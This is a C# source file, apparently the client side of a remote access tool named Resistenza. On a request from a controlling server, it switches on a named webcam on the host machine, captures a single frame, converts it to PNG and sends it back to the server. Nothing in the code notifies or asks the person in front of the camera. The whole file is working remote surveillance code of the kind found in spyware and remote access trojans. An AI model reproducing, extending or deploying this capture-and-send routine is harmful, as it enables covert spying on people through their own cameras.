using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using AForge.Video;
using AForge.Video.DirectShow;
using System.Drawing.Imaging;
using System.Drawing;
using NAudio.CoreAudioApi;



namespace Resistenza.Common.Packets.Camera
{
    public class CamScreenshotRequest
    {
        public string Type { get; set; }
        public string NameTargetCam { get; set; }

        public CamScreenshotRequest()
        {
            Type = this.GetType().ToString();

        }

        private SecureStream _ServerStream;
        private VideoCaptureDevice _Camera;
        private bool _ScreenshotTaken;
        public async Task HandleAsync(SecureStream ServerStream)
        {
            _ServerStream = ServerStream;
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            string MonikerString = string.Empty;

            foreach (FilterInfo DeviceInfo in videoDevices)
            {
                if (DeviceInfo.Name == NameTargetCam)
                {
                    MonikerString = DeviceInfo.MonikerString;

                    break;

                }
            }

           _ScreenshotTaken = false;
           _Camera = new VideoCaptureDevice(MonikerString);
           _Camera.NewFrame += Camera_NewFrame;
           _Camera.Start();

            while (!_ScreenshotTaken) {
                await Task.Delay(100);
            }

            _Camera.SignalToStop();
            _Camera.WaitForStop();
        }

        private async void Camera_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {

            if (!_ScreenshotTaken)
            {
                CamFrameResponse Frame = new CamFrameResponse()
                {
                    Data = ConvertFrameToByteArray(eventArgs.Frame)
                };


                await _ServerStream.SendPacketAsync(Frame);
                _ScreenshotTaken = true;
            }
            

        
        }

        private byte[] ConvertFrameToByteArray(Bitmap Frame)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                Frame.Save(stream, ImageFormat.Png);
                return stream.ToArray();
            }
        }
    }
}
